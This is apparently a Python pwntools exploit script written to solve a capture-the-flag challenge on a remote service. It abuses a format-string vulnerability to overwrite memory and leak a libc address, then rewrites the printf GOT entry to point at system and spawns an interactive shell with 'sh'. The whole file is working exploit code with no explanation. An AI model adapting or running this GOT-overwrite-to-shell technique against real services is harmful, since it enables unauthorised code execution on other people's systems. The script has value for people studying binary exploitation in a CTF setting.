#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10129
#host = 'localhost'
#port = 4000

r = remote(host, port)
total_length = 0
def fmt(prev, target, adr): # hhn
    global total_length
    total_length += ((target - prev) % 256)
    return "%" + str((target - prev) % 256) + "c%" + str(adr) + "$hhn"
def fmt_hn(prev, target, adr): # hhn
    global total_length
    total_length += ((target - prev) % 0xffff)
    return "%" + str((target - prev) % 0xffff) + "c%" + str(adr) + "$hn"
base = 16
a = 0x6012ac

puts_base = 0x809c0
system_base = 0x4f440

system_got = 0x601228
puts_got = 0x601218
printf_got = 0x0000000000601230

start = 23
payload = ''
payload += fmt_hn(0, 0xb00c, start)
payload += fmt_hn(0xb00c, 0xface, start+1)
payload += "%8$p %9$p@%25$s"
print (len(payload))
print (payload)
payload = payload.ljust((start - 16)*8, 'a')
payload += p64(a) + p64(a+0x2) + p64(puts_got)
print (len(payload))
r.recvuntil('?')
r.sendline(payload)
r.recvuntil(':\n')
x = r.recvuntil("@")[:-1]
start_place = x.find('0x')
x = x[start_place:].strip().split(' ')
print (x[0], x[1])
x = [int(i, 16) for i in x]


x2 = r.recvuntil('aaaaaaa')[:-7]
puts_libc = u64(x2.strip().ljust(8, '\x00'))
print 'puts libc : ', hex(u64(x2.strip().ljust(8, '\x00')))
system = puts_libc - puts_base + system_base
print ('system libc : ', hex(system))
r.send(p64(x[0]) + p64(x[1]))

start2 = 14
payload2 = ''
payload2 += fmt_hn(0, system & 0xffff, start2)
payload2 += fmt(system & 0xffff, (system >> 16) & 0xff, start2 + 1)
print (len(payload2))
payload2 = payload2.ljust((start2 - 10)*8, 'a')
payload2 += p64(printf_got) + p64(printf_got + 0x2)[:-1]
print payload2

print (len(payload2))
r.sendline(payload2)
r.sendline('sh')
r.interactive()

